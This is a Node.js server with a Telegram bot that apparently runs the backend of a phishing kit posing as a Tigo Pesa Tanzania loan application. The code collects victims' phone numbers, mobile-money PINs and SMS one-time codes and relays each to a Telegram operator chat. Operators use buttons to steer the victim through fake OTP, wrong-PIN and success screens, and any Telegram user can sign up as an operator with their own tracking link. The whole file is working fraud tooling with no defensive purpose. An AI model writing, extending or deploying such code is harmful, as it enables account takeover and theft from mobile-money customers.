/**
 * **MIXX BY YAS - COMPLETE DYNAMIC MULTI-ADMIN BACKEND SERVER**
 * 
 * Features:
 * - Fully automated admin registration (?admin=01, ?admin=02, etc.) via /start.
 * - Persistent JSON mapping storage so new admins work permanently.
 * - Isolated message routing ensuring alerts go exclusively to the correct admin.
 * - Strict Tigo Pesa Tanzania phone verification & complete session workflows.
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || null;
const APP_URL = process.env.APP_URL || null;
const USE_WEBHOOK = String(process.env.USE_WEBHOOK || 'false').toLowerCase() === 'true';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TOKEN}`;
let bot = null; 
const sessions = new Map();

/**
 * **DYNAMIC ADMIN STORAGE FILE PATH**
 * Automatically tracks and saves all incoming admins.
 */
const ADMIN_FILE = path.join(__dirname, 'admins.json');

function loadAdminMapping() {
  try {
    if (fs.existsSync(ADMIN_FILE)) {
      const data = fs.readFileSync(ADMIN_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (err) {
    console.error('[Error] Failed to load admins.json:', err);
  }
  return {
    "01": "8524294724" // Primary baseline fallback
  };
}

function saveAdminMapping(mapping) {
  try {
    fs.writeFileSync(ADMIN_FILE, JSON.stringify(mapping, null, 2), 'utf8');
  } catch (err) {
    console.error('[Error] Failed to save admins.json:', err);
  }
}

let ADMIN_MAPPING = loadAdminMapping();

function resolveAdminChatId(adminKeyOrId) {
  if (!adminKeyOrId) return DEFAULT_CHAT_ID;
  return ADMIN_MAPPING[adminKeyOrId.toLowerCase()] || adminKeyOrId || DEFAULT_CHAT_ID;
}

/**
 * **TIGO PESA TANZANIA NUMBER VALIDATOR**
 */
function isValidTigoNumber(phoneStr) {
  if (!phoneStr) return false;
  const cleaned = String(phoneStr).trim().replace(/[\s\-\(\)]/g, '');
  const tigoRegex = /^(?:\+?255|0)?(65|67|71|77)\d{7}$/;
  return tigoRegex.test(cleaned);
}

async function telegramApi(pathSuffix, options = {}) {
  const url = `${TELEGRAM_API_BASE}/${pathSuffix}`;
  const res = await fetch(url, options);
  return res.json();
}

async function initBot() {
  if (USE_WEBHOOK) {
    if (!APP_URL) {
      console.error('USE_WEBHOOK is true but APP_URL is not set; cannot enable webhook mode.');
      process.exit(1);
    }
    bot = new TelegramBot(TOKEN, { polling: false });
    const webhookPath = `/bot${TOKEN}`;
    const webhookUrl = `${APP_URL}${webhookPath}`;
    try {
      await bot.setWebHook(webhookUrl);
      app.post(webhookPath, (req, res) => {
        res.sendStatus(200);
        try {
          bot.processUpdate(req.body);
        } catch (err) {
          console.error('[Bot] Error processing update from webhook:', err);
        }
      });
    } catch (err) {
      console.error('[Bot] Failed to set webhook:', err);
      process.exit(1);
    }
  } else {
    try {
      const info = await telegramApi('getWebhookInfo');
      if (info && info.ok && info.result && info.result.url) {
        await telegramApi('deleteWebhook');
      }
    } catch (err) {}
    bot = new TelegramBot(TOKEN, { polling: true });
  }

  bot.on('polling_error', (err) => console.error('[Bot] polling_error:', err?.message || err));
  bot.on('webhook_error', (err) => console.error('[Bot] webhook_error:', err?.message || err));

  /**
   * **AUTOMATIC DYNAMIC /START HANDLER FOR NEW ADMINS**
   */
  bot.onText(/\/start/, async (msg) => {
    const chatId = String(msg.chat.id);
    const user = msg.from;

    const firstName = user.first_name || 'Not Provided';
    const lastName = user.last_name || '';
    const fullName = `${firstName} ${lastName}`.trim();
    const username = user.username ? `@${user.username}` : 'No username set';
    
    // Check if this chat ID is already registered in mapping
    let adminCode = Object.keys(ADMIN_MAPPING).find(key => ADMIN_MAPPING[key] === chatId);

    if (!adminCode) {
      // Automatically generate next sequential professional number (01, 02, 03...)
      const existingKeys = Object.keys(ADMIN_MAPPING).filter(k => !isNaN(k));
      const nextNum = existingKeys.length > 0 ? Math.max(...existingKeys.map(Number)) + 1 : 1;
      adminCode = String(nextNum).padStart(2, '0');

      ADMIN_MAPPING[adminCode] = chatId;
      saveAdminMapping(ADMIN_MAPPING);
      console.log(`[Admin] Registered new incoming admin: ${fullName} as code ${adminCode} (${chatId})`);
    }

    const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${adminCode}`;
    const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;

    const userWelcomeInfo = 
      `🚨 **Admin Link Registered Successfully!**\n\n` +
      `👤 **Name:** ${fullName}\n` +
      `🆔 **Chat ID:** \`${user.id}\`\n` +
      `🔢 **Assigned Code:** \`${adminCode}\`\n` +
      `🏷 **Username:** ${username}\n\n` +
      `🔗 **Your Unique Application Link:**\n${cleanBrowseLink}\n\n` +
      `🔗 **Admin Dashboard Link:**\n${secureAdminLink}`;

    await bot.sendMessage(chatId, userWelcomeInfo, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    }).catch(err => console.error('[Bot] Failed to send info to user:', err.message));
  });

  /**
   * **CALLBACK QUERY HANDLER FOR ISOLATED ADMIN BUTTON ACTIONS**
   */
  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const userId = parts.slice(2).join('_');

      const session = sessions.get(userId);
      if (!session) {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Session expired or not found.' });
        return;
      }

      const chatTarget = session.adminChatId || DEFAULT_CHAT_ID;
      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'APPROVED_LOAD_OTP';
          await bot.sendMessage(chatTarget, `✅ OTP Screen loaded for +255 ${session.phone}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Access Denied for +255 ${session.phone}`);
          break;
        case 'CORRECT_OTP':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for +255 ${session.phone}`);
          break;
        case 'WRONG_PIN':
          session.status = 'WRONG_PIN_ERROR';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error for +255 ${session.phone}`);
          break;
        case 'WRONG_OTP':
          session.status = 'WRONG_OTP_ERROR';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error for +255 ${session.phone}`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` });

      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(err => {});
      }
    } catch (err) {}
  });
}

/**
 * **EXPLICIT FRONTEND ROUTES**
 */
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'app.html'));
});

app.get('/secret-admin-panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

/**
 * **SUBMIT APPLICATION (PIN ENTRY) - TARGETED EXCLUSIVELY TO CORRECT ADMIN**
 */
app.post('/api/submit-application', (req, res) => {
  try {
    const { phone, pin, amount, adminChatId } = req.body || {};

    if (!isValidTigoNumber(phone)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid phone number format.' 
      });
    }

    const targetChat = resolveAdminChatId(adminChatId);
    const userId = phone || `user_${Date.now()}`;

    sessions.set(userId, {
      phone,
      pin,
      amount: amount || 'TZS 1,000,000',
      adminChatId: targetChat,
      status: 'WAITING_PIN_APPROVAL',
      createdAt: new Date()
    });

    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'No admin chat ID configured' });
    }

    const message =
      `🚨 *NEW LOAN LOGIN / PIN ATTEMPT*\n\n` +
      `📱 *Tigo Phone:* +255 ${phone}\n` +
      `🔑 *PIN Entered:* \`${pin}\`\n` +
      `💰 *Selected Amount:* ${amount}\n\n` +
      `📌 *Status:* Waiting for Admin Approval`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
            { text: '❌ DENY OTP', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    bot.sendMessage(targetChat, message, opts)
      .then(sentMsg => {
        const session = sessions.get(userId);
        if (session) session.adminMsgId = sentMsg.message_id;
        res.status(200).json({ success: true, userId });
      })
      .catch(err => {
        res.status(500).json({ success: false, error: 'Telegram notification failed' });
      });

  } catch (error) {
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

/**
 * **CHECK SESSION STATUS ENDPOINT**
 */
app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

/**
 * **RECEIVE SMS OTP & PROMPT CORRECT ADMIN**
 */
app.post('/api/submit-otp', (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message =
      `📩 *SMS OTP SUBMITTED BY USER*\n\n` +
      `📱 *Tigo User:* +255 ${session.phone}\n` +
      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
      `Choose verification response:`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
          ],
          [
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
    bot.sendMessage(targetChat, message, opts).catch(() => {});

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

/**
 * **REQUEST NEW OTP ENDPOINT**
 */
app.post('/api/request-new-otp', (req, res) => {
  try {
    const { userId } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.status = 'APPROVED_LOAD_OTP';

    const message =
      `🔄 *USER REQUESTED NEW OTP*\n\n` +
      `📱 *Tigo User:* +255 ${session.phone}\n` +
      `⚠️ The user's countdown expired and they requested a new OTP code.`;

    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Initialize server and bot polling/webhooks
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`[Server] Running smoothly on port ${PORT}`);
  await initBot();
});
    
